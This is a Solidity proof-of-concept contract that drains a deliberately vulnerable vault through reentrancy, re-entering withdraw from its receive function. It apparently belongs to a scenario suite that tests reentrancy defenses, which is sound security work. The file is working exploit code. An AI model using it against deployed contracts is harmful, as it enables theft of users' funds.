// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title ReentrancyAttacker — Scenario 01 canonical exploit PoC.
/// @notice Deposits one chunk, then drains the vault by re-entering `withdraw`
///         from `receive` before the vault updates its accounting. If a
///         defense blocks any nested call, the revert propagates and the whole
///         attack unwinds (the vault keeps its funds).
contract ReentrancyAttacker {
    VulnerableVault public immutable vault;
    uint256 public chunk;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        chunk = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(chunk);
    }

    receive() external payable {
        if (address(vault).balance >= chunk) {
            vault.withdraw(chunk);
        }
    }
}
